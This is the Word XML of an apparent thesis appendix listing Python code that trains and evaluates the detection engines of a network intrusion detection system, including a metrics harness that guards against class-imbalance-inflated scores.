    <w:p w14:paraId="3C598C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n_safe = sum(1 for _, l in rows if l == "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527E1F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n_mal == 0 or n_safe == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9C9E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ValueError("payload set must have both classes")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5276535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686D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likelihoods = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613ABE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w in keywords:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A153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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="391E5B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l in {"Malicious", "Attack"} and w in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB00A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 = sum(1 for p, l in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688497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l == "Normal" and w in p.upper())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C639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laplace smoothing so we never get zero</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9586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p_mal = (m + laplace) / (n_mal + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4951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p_safe = (s + laplace) / (n_safe + 2 * laplace)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB73E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likelihoods[w] = (round(p_mal, 6), round(p_safe, 6))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E012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3A8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prior_mal = n_mal / (n_mal + n_safe)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6583A8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print("[NB ] %d payloads (mal=%d safe=%d) prior=%.3f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D5E8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% (len(rows), n_mal, n_safe, prior_mal))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574B59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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BE5F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"prior_malicious": round(prior_mal, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227317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"prior_safe": round(1 - prior_mal, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344A6B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"likelihoods": likelihoods,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260573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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A36DF0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1740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177F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train_kmeans(points, k=3, iters=25):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118862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len(points) &lt; k:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3839F9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ValueError("need &gt;= %d points" % k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232CCA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spread initial centroids across the data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086CE9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step = max(1, len(points) // k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554A65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cents = [list(points[i * step]) for i in range(k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221A495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7BB4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d(a, b):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BBA6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math.sqrt(sum((x - y) ** 2 for x, y in zip(a, b)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE5837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F08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_ in range(iters):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34834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groups = [[] for _ in range(k)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9F8D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 in points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000CC7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groups[min(range(k), key=lambda i: d(p, cents[i]))].append(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055321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moved = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613F36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i, g in enumerate(groups):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512429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not g:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7359F6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5D446B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new = [sum(m[j] for m in g) / len(g) for j in range(len(g[0]))]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D2EA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moved += d(cents[i], new)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8602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cents[i] = new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12292D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moved &lt; 1e-3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CD31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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0087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print("[KM ] %d centroids on %d points: %s" % (k, len(points), cents))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5EA4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{"k": k, "alpha": 0.05, "centroids": cents}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE4B9D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B957F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71C0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write_brain(path, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DFD5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os.makedirs(os.path.dirname(path) or ".", exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111097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base = path[:-5] if path.endswith(".json") else path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4498BC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"%s_%s.json" % (base, time.strftime("%Y%m%d_%H%M%S"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3285E6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open(out, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E4E9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json.dump(brain, f, indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D791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print("[+] saved", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF4F9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6A0E80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6E59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6F91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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382AFC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argparse.ArgumentParser(prog="mantis-train",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64314E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description="train mantis from a dataset")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529D01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p.add_argument("--knn-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5261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p.add_argument("--payload-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6EC5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p.add_argument("--kmeans-csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479D30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p.add_argument("--cic-iot2023", help="CIC-IoT2023 flow csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7454B1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p.add_argument("--json", dest="json_path",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70350B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help="combined json file with knn/payload/kmeans keys")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFDFF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p.add_argument("--out", default="data/mantis_brain.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544B3C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p.add_argument("--max-knn-samples", type=int, default=5000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654BC4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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26AEB2D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0FF86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B9BC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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227695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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A57CA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 = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551208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used = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCB958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34BF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args.json_path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A463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data = loader.load_json(args.json_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="277E8E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"knn" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2C5D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brain["knn"] = train_knn(data["knn"], args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A116A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"payload" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393ABE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brain["payload"] = train_naive_bayes(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9D67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[(r["payload"], r["label"]) for r in data["payload"]])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A96E1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"kmeans" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4952D7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brain["kmeans"] = train_kmeans(data["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3499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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF7F4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71D2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args.cic_iot2023:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA2BA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cic = loader.load_cic_iot2023(args.cic_iot2023)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D5BF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brain["knn"] = train_knn(cic["knn"], args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A163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brain["kmeans"] = train_kmeans(cic["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FCBA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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8EE8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6939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if args.knn_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD2AA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brain["knn"] = train_knn(loader.load_knn_csv(args.knn_csv),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED457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args.max_knn_samples)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033DE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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C3A08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F2DA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args.payload_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A5E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brain["payload"] = train_naive_bayes(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769C55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loader.load_payload_csv(args.payload_csv))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668509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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18C7F0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5D28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args.kmeans_csv:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E5CF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brain["kmeans"] = train_kmeans(loader.load_kmeans_csv(args.kmeans_csv))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C6831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used += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3432EA7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5947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used == 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C29E6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no dataset given. try --help")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8289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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DE347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8FC9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brain["_meta"] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52396C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"trained_at": time.strftime("%Y-%m-%d %H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0014DA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"engines": sorted(k for k in brain if not k.startswith("_")),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B078E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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BFCEA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write_brain(args.out, brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B8E9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70D35E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CC80E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7ADA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331718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18060382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Evaluation Harness</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C15151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src/evaluation/evaluate.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48596804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(510 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F848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57F8C7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runs each engine over a labelled dataset and prints TP/FP/precision/recall/f1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0C08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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBC2F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04696E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glob</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCE04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098107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35FD5B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53AA7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random</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF041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150BB3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CFE26F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2B0F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37F22C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608F09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6A6AF1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23C62C5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A03C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bloom as bloom_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123E09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kmeans as kmeans_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FDE3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knn as knn_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5710C4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naive_bayes as nb_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395579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z_score as zscore_engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F17E3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training import loader</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F8D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A742A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B50A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confusion(y_true, y_pred, positive):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776AAB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 = fp = fn = tn = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524678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t, p in zip(y_true, y_pred):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="749092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t == positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69527E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tp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBD11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!= positive and p == positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5721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fp += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559D6B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== positive and p != positive:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133259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fn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA461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762C3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tn += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19317D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{"tp": tp, "fp": fp, "fn": fn, "tn": tn}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA923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C474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BF65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scores(cm):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15996C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"""Derive metrics from a confusion matrix, including prevalence-aware ones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E36B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9446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Precision, recall, F1 and accuracy are all sensitive to class balance, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2750B9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on a corpus dominated by one class they flatter a detector that has learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED79D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nothing. CIC-IoT2023 is 97.6% attack, so a classifier that simply answers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C90F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"attack" every time scores F1 = 0.9879 there while having no skill at all.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C5FB6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Reporting only F1 against such a corpus therefore cannot distinguish a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF025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working engine from a constant function.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCD16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E0C5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Three additions make the numbers interpretable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF3A1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8733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specificity        - recall on the negative class, which a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D5F9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majority-positive guesser scores 0.0 on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C79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balanced_accuracy  - mean of recall and specificity, so both classes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C651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count equally regardless of prevalence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74292B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mcc                - Matthews correlation coefficient, which uses all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A776A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four cells and is 0.0 for any constant classifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023E95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F5B0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`no_skill_f1` records what the majority-positive baseline would score on</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7B98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same data, so every reported F1 can be read against the number it has</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799690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to beat to mean anything.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="204410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6E2B5E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tp, fp, fn, tn = cm["tp"], cm["fp"], cm["fn"], cm["tn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DC4F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total = tp + fp + fn + tn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED7E3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 = tp / (tp + fp) if (tp + fp) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4701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rc = tp / (tp + fn) if (tp + fn) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFF29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sp = tn / (tn + fp) if (tn + fp) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60EC04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f1 = (2 * pr * rc / (pr + rc)) if (pr + rc) else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598264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acc = (tp + tn) / total if total else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A4EC0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bal = (rc + sp) / 2.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A41A8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FC3E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denom = math.sqrt(float(tp + fp) * (tp + fn) * (tn + fp) * (tn + fn))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EEE4A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mcc = ((tp * tn - fp * fn) / denom) if denom else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B055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BBB7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majority-positive baseline on this same data: predict positive always</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7F6D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pos = tp + fn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9E90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prevalence = (pos / total) if total else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A121A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ns_f1 = (2 * prevalence / (prevalence + 1.0)) if prevalence else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4392AC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FE28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{"precision": round(pr, 4), "recall": round(rc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6563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"specificity": round(sp, 4), "f1": round(f1, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B1FE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"accuracy": round(acc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787943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"balanced_accuracy": round(bal, 4), "mcc": round(mcc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F226B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"prevalence": round(prevalence, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4679FC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"no_skill_f1": round(ns_f1, 4)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50CA2B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E41E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8215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load_brain(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218389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"""Resolve the brain to evaluate against.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E460F7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CCE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Passing nothing evaluates the seeded engines, which is the reproducible</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B1BF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default: silently picking up whichever brain file happened to be newest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E158A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made the same command produce different metrics on different days, and made</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B76FB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published figures impossible to re-derive. Use `--brain auto` for the old</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E994A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behaviour, or name a file explicitly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D8C85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8A67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Note that a brain must be evaluated on data drawn from the same feature</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C1E3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distribution it was trained on. A CIC-IoT2023 brain scored against the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3D23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small hand-built sample CSVs reports meaningless numbers, because the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7C84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occupy different regions of the feature space.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFC40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430A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path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19025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no --brain given: evaluating seeded engines "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E83E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"(reproducible default)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B6D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{}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CA07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path == "auto":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9A65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candidates = sorted(glob.glob("data/mantis_brain_*.json"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54479A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candidates:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F6D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no brain files found in data/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2E32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{}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6178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path = candidates[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F695B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using latest brain:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E3DA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os.path.isfile(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4EC6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brain not found:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481425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{}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F811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encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C57A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evaluating against brain:", path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D030A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json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BB145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07DE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FF8F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evaluate_knn(rows, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2849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 = knn_engine.KNNMonitor(k=brain.get("knn", {}).get("k", 3))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03938C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"knn" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E79D7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eng.import_brain(brain["knn"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334D94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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423D6F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for ports, pkts, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E6E0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_ = eng.classify(ports, pkts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="393C05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yt.append(label)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB9FA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yp.append(verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD76C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 = confusion(yt, yp, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166C5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{"engine": "KNN (Port Scan)", "samples": len(rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F2DF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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047B27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A5EE9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BF52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evaluate_payload(rows, brain):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D765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 = nb_engine.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174C65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"payload" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68DF18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eng.import_brain(brain["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BBAC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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C39E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payload, label in rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169DB3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_, _ = eng.classify(payload.encode("utf-8", errors="ignore"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B080E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yt.append("Malicious" if label in {"Malicious", "Attack"} else "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1B59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yp.append(verdict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174E15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 = confusion(yt, yp, "Malicious")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AB16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{"engine": "Naive Bayes (Payload)", "samples": len(rows),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2399BF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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4FDF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4E725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848A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evaluate_zscore(series, threshold=3.0, window=30, guard_baseline=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACFD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"""Evaluate the volumetric engine through its uniform analyse() interface.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316F0F2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A4E3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`guard_baseline=False` reproduces the naive estimator, which lets the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC79F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variants be reported side by side (see --compare). The difference is large:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0149A2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without the guard a sustained flood is absorbed into the rolling baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EA44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within `window` seconds and recall collapses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36503F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3FA79D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 = zscore_engine.MinimalistStats(window_size=window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C5824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threshold=threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C794C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guard_baseline=guard_baseline)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546EFC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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C69A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pps, label in series:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E255F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 = eng.analyse(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD670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yp.append("DDoS" if verdict.is_threat else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FAEBF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yt.append("DDoS" if label in {"DDoS", "Attack", "Malicious"} else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF737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 = confusion(yt, yp, "DDoS")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702C1F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name = "Z-Score (DDoS)" if guard_baseline else "Z-Score (DDoS, naive baseline)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B516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{"engine": name, "samples": len(series),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293F6A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"threshold": threshold, "window": window,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F80A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"guard_baseline": guard_baseline,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46AB6F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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D7398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C7929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507A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evaluate_kmeans(series, brain, k=3, alpha=0.05, radius_multiplier=3.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51710A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"""Evaluate the clustering engine as a novelty detector.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A90C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46DB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Chapter 6 previously reported no K-Means figures at all, while Chapter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2168FD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6.3.2 relied on the engine to supplement the ensemble. Because the engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53DAFC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now decides on distance from the learned centroids rather than on cluster</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1322EB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identity, it produces a binary verdict that can be scored like the others.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB9D8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1DAD94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 = kmeans_engine.KMeansMonitor(k=k, learning_rate=alpha,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272293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radius_multiplier=radius_multiplier)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="748CE0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"kmeans" in brain:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B852E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eng.import_brain(brain["kmeans"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6635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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F13F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pps, ports, label in series:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BE20B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 = eng.analyse(pps, ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19EA39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yp.append("Anomaly" if verdict.is_threat else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A5AD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yt.append("Anomaly" if label in {"Anomaly", "Attack", "Malicious",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FCB4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"DDoS", "Scan"} else "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40AB3F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 = confusion(yt, yp, "Anomaly")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A6CA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{"engine": "K-Means (Novelty)", "samples": len(series),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA13C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"radius_multiplier": radius_multiplier,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D999D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"confusion_matrix": cm, **scores(cm)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0948F7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4065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7FD0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evaluate_bloom(rows, size=1000, hashes=3, train_split=0.5):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667935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"""Evaluate the reputation filter, and measure its false-positive rate.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530201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0983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Bloom filters cannot produce false negatives, so recall on the indicators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFE2F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actually loaded is 1.0 by construction. The figure worth reporting is the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0480AD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empirical false-positive rate on addresses that were never inserted, which</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578AEA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is what the bit-array sizing trades against memory. Both are reported here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074FFC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228F63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malicious = [ip for ip, label in rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D7C9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if label in {"Malicious", "Attack", "Blacklisted"}]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5393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benign = [ip for ip, label in rows if ip not in set(malicious)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673C429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D38C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split = max(1, int(len(malicious) * train_split))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D3F8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loaded, held_out = malicious[:split], malicious[split:]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69EE9B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C514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 = bloom_engine.BloomFilter(size=size, hash_count=hashes)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BAC5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ip in loaded:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183A63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eng.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130756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94C7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yt, yp = [], []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C5B6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ip in loaded:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF81B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yt.append("Blacklisted")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553B62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yp.append("Blacklisted" if eng.check(ip) else "Unknown")</w:t>
      </w:r>
    </w:p>
